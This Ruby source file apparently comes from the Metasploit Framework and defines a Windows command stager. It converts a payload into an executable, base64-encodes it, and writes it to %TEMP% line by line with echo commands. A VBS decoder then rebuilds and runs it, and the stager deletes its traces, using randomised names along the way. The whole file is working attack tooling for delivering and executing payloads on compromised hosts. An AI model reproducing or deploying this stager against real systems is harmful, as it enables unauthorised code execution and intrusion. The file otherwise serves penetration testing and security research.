require 'rex/text'
require 'rex/arch'
require 'msf/core/framework'

module Rex
module Exploitation

###
#
# This class provides an interface to generating cmdstagers.
#
###

class CmdStager

	module Windows
		Alias = "win"

		module X86
			Alias = ARCH_X86
		end

		module X86_64
			Alias = ARCH_X86_64
		end
	end


	def initialize(payload, framework, platform, arch = nil)
		@var_decoder = Rex::Text.rand_text_alpha(5)
		@var_encoded = Rex::Text.rand_text_alpha(5)
		@var_batch   = Rex::Text.rand_text_alpha(5)
		@decoder	    =	File.join(Msf::Config.install_root, "data", "exploits", "cmdstager", "decoder_stub") # need error checking here
		@framework   =	framework
		@exes	       = Msf::Util::EXE.to_win32pe(@framework, payload.encoded)
		@linelen     = 2047 # covers most likely cases

		platform   = platform.names[0] if (platform.kind_of?(Msf::Module::PlatformList))

		# Use the first architecture if one was specified
		arch = arch[0] if (arch.kind_of?(Array))

		if platform.nil?
			raise RuntimeError, "No platform restrictions were specified -- cannot select egghunter"
		end

		CmdStager.constants.each { |c|
			mod = self.class.const_get(c)

			next if ((!mod.kind_of?(::Module)) or
					(!mod.const_defined?('Alias')))

			if (platform =~ /#{mod.const_get('Alias')}/i)
				self.extend(mod)

				if (arch and mod)
					mod.constants.each { |a|
						amod = mod.const_get(a)

						next if ((!amod.kind_of?(::Module)) or
						         (!amod.const_defined?('Alias')))

						if (arch =~ /#{mod.const_get(a).const_get('Alias')}/i)
							amod = mod.const_get(a)

							self.extend(amod)
						end
					}
				end
			end
		}

	end

	# generates the cmd payload including the h2bv2 decoder and encoded payload
	# also performs cleanup and removed any left over files
	def generate(opts = {}, linelen = 200)
		@linelen = linelen
		cmd = payload_exe

		return cmd
	end

	def payload_exe(persist = false)

		if(persist)
			opts = {:persist => true}
		else
			opts = {}
		end

		decoder = generate_decoder()

		exe = @exes.dup
		encoded = encode_payload(exe)

		stage = encoded + decoder
		stage << "cscript //nologo %TEMP%\\#{@var_decoder}.vbs\n"

		if(not persist)
			stage << "del %TEMP%\\#{@var_decoder}.vbs\n"
			stage << "del %TEMP%\\#{@var_encoded}.b64\n"
		end

		return stage
	end

	def generate_decoder()
		decoder = File.read(@decoder, File.size(@decoder))
		decoder.gsub!(/decode_stub/, "%TEMP%\\#{@var_decoder}.vbs")
		decoder.gsub!(/ENCODED/, "%TEMP%\\#{@var_encoded}.b64")
		decoder.gsub!(/DECODED/, "%TEMP%\\#{@var_batch}.exe")

		return decoder
	end

	def encode_payload(cmd)
		tmp = Rex::Text.encode_base64(cmd)
		encoded = ""

		buf = buffer_exe(tmp)
		buf.each_line { | line |
			encoded << "echo " << line.chomp << ">>%TEMP%\\#{@var_encoded}.b64\n"
		}

		return encoded
	end

protected

	# restricts line length of commands so that the commands will not exceed
	# user specified values or os_detect set linelen
	# each line will never exceed linelen bytes in length
	def buffer_exe(buf)
		0.upto(buf.length) do | offset |
			if(offset % @linelen == 0 && offset != 0 || offset == buf.length)
				buf.insert(offset, "\n")
			end
		end
		return buf
	end

end
end
end
